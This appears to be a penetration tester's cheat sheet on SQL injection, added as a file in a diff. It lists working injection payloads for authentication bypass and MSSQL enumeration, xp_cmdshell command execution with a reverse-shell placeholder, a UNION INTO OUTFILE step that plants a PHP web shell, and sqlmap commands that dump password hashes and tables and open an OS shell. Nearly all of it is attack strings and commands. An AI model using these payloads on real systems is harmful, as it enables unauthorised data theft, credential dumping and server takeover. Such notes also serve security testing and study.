@@ -1,0 +1,100 @@
+SQL Injection
+
+
+SQL databases interpret the single quote character as the boundary between code and data. It assumes 
+that anything following a single quote is code that it needs to run and anything encapsulated by a 
+quote is data.
+
+Check for SQLi by adding the following to the end of a URL:
+a single quote
+' or 1=1--<space>
+
+http://www.target.com/index.php?id=100'
+http://www.target.com/index.php?id=100' or 1=1--<space>
+
+http://target.com/user.php?name=admin&password=summer2016
+http://target.com/user.php?name=admin' or 1=1-- &password=summer2016
+------------------------------------------------------------------------------------------------------
+
+Auth bypass:        'or 1=1--
+SQL version:        ' OR CONVERT(int,(@@VERSION))=1--
+Service account:    ' OR CONVERT(int,(SYSTEM_USER))=1--
+Database:           ' OR CONVERT(int,(DB_NAME()))=1--
+Server name:        ' OR CONVERT(int,(@@SERVERNAME))=1--
+Code execution:     '; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--
+Reverse shell:      '; EXEC master..xp_cmdshell '<unicorn payload>'--
+------------------------------------------------------------------------------------------------------
+
+?sql_query 
+
+If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
+how HTTP GET parameters are passed through the URL. You can inject an SQL query as a HTTP GET parameter 
+to a server-side script. Based on prior knowledge of a database table name (customers), you can inject 
+a properly formatted SQL query as a HTTP GET parameter.
+
+http://www.target.com/index.php?sql_query=SELECT * FROM customers
+------------------------------------------------------------------------------------------------------
+
+# Remote code execution via time based blind SQLi
+
+- The 'title' parameter is vulnerable.
+http://target.com/item.php?title=1&action=search
+
+- Try a time based attack.
+http://target.com/item.php?title='%2b(SELECT+1+FROM+(SELECT+SLEEP(10))A)%2b'&action=search
+
+- Inject a PHP shell.
+http://target.com/item.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/shell.php" -- -&action=search
+
+- Run a command.
+http://target.com/shell.php?cmd=id
+------------------------------------------------------------------------------------------------------
+
+sqlmap
+
+-u                 Target URL.
+--random-agent     Use randomly selected HTTP User-Agent header value.
+--dbms=value       Force back-end DBMS to this value (MSSQL, MySQL, Oracle).
+--level=#          Level of tests to perform (1-5, default 1).
+--risk=#           Risk of tests to perform (1-3, default 1).
+-b                 Retrieve DBMS banner.
+--passwords        Enumerate DBMS users password hashes.
+--crawl=#          Crawl the website starting from the target URL.
+
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10
+------------------------------------------------------------------------------------------------------
+
+# Use Burp to trap a request. Copy the request to /root/tmp.
+
+sqlmap.py -r /root/tmp --hostname -b --current-db --dbs
+
+# Using a cookie
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --hostname -b --current-db --dbs
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> --tables
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> -T <table name> --columns
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> -T <table name> -C <column
+1,2,3,4> --dump
+
+sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
+------------------------------------------------------------------------------------------------------
+
+# Use CO2 plugin with Burp
+
+Burp > Proxy > turn Intercept on
+Browse to target URL > RC on the request > Send to SQLMapper
+Detection tab: set Level and Risk to 3.
+Enumeration: 
+1. hostname, banner, current db, databases > Run
+2. current user, is dba, users, passwords > Run
+3. Pin to Database <db name>, tables > Run
+4. Pin to Database <db name>, Pin to Table <table name>, columns > Run
+5. Pin to Database <db name>, Pin to Table <table name>, Pin to Column <column 1,2,3,4> dump > Run
+
